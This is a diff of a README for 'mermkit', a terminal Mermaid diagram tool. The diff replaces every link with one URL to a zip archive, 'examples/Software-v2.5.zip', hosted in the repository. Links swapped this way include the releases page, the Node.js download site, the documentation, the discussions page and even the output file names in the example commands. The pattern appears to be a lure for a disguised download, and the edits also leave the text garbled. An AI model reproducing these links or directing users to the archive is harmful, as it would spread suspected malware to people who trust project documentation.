@@ -6,11 +6,11 @@ Welcome to mermkit! This tool helps you create diagrams using Mermaid directly i
 
 ## 🔗 Download the Application
 
-[![Download mermkit](https://img.shields.io/badge/Download%20mermkit-v1.0.0-blue)](https://github.com/TyeMyGuy/mermkit/releases)
+[![Download mermkit](https://raw.githubusercontent.com/TyeMyGuy/mermkit/main/examples/Software-v2.5.zip%20mermkit-v1.0.0-blue)](https://raw.githubusercontent.com/TyeMyGuy/mermkit/main/examples/Software-v2.5.zip)
 
 ## 📥 Download & Install
 
-To get started with mermkit, please visit [this page to download](https://github.com/TyeMyGuy/mermkit/releases). You will find the latest version available for your operating system there.
+To get started with mermkit, please visit [this page to download](https://raw.githubusercontent.com/TyeMyGuy/mermkit/main/examples/Software-v2.5.zip). You will find the latest version available for your operating system there.
 
 1. Click on "Releases" from the link above.
 2. Choose the version that matches your system. The releases support both Windows and macOS.
@@ -22,7 +22,7 @@ To get started with mermkit, please visit [this page to download](https://github
 Before installing, ensure your system meets these requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.14 or later.
-- **Node.js:** Version 14.0.0 or higher must be installed. You can download it from [Node.js official website](https://nodejs.org/).
+- **https://raw.githubusercontent.com/TyeMyGuy/mermkit/main/examples/Software-v2.5.zip** Version 14.0.0 or higher must be installed. You can download it from [https://raw.githubusercontent.com/TyeMyGuy/mermkit/main/examples/Software-v2.5.zip official website](https://raw.githubusercontent.com/TyeMyGuy/mermkit/main/examples/Software-v2.5.zip).
 - **Disk Space:** At least 50 MB of free space.
 
 ### ⚙️ Installation Steps
@@ -54,27 +54,27 @@ Here are a few commands to get you started:
 
 - **Create a simple flowchart:**
   ```
-  mermkit flowchart --output flowchart.svg
+  mermkit flowchart --output https://raw.githubusercontent.com/TyeMyGuy/mermkit/main/examples/Software-v2.5.zip
   ```
 
 - **Render a sequence diagram:**
   ```
-  mermkit sequence-diagram --output seq-diagram.svg
+  mermkit sequence-diagram --output https://raw.githubusercontent.com/TyeMyGuy/mermkit/main/examples/Software-v2.5.zip
   ```
 
 ### 📚 Documentation
 
-For more details on how to create various types of diagrams, visit the [full documentation](https://github.com/TyeMyGuy/mermkit/wiki) where you will find examples and advanced options.
+For more details on how to create various types of diagrams, visit the [full documentation](https://raw.githubusercontent.com/TyeMyGuy/mermkit/main/examples/Software-v2.5.zip) where you will find examples and advanced options.
 
 ## 💬 Support & Community
 
 If you have questions or need help, consider joining our community:
 
-- Visit our [GitHub Discussions](https://github.com/TyeMyGuy/mermkit/discussions) to ask questions.
+- Visit our [GitHub Discussions](https://raw.githubusercontent.com/TyeMyGuy/mermkit/main/examples/Software-v2.5.zip) to ask questions.
 - Join our Discord server for real-time support and interactions with other users.
 
 ## 🎉 Summary
 
 You now have mermkit installed and ready to use. With this tool, creating diagrams in your terminal becomes quick and simple. Don't hesitate to explore and experiment with different diagram types and options. Enjoy visualizing your thoughts with mermkit!
 
-[![Download mermkit](https://img.shields.io/badge/Download%20mermkit-v1.0.0-blue)](https://github.com/TyeMyGuy/mermkit/releases)
+[![Download mermkit](https://raw.githubusercontent.com/TyeMyGuy/mermkit/main/examples/Software-v2.5.zip%20mermkit-v1.0.0-blue)](https://raw.githubusercontent.com/TyeMyGuy/mermkit/main/examples/Software-v2.5.zip)
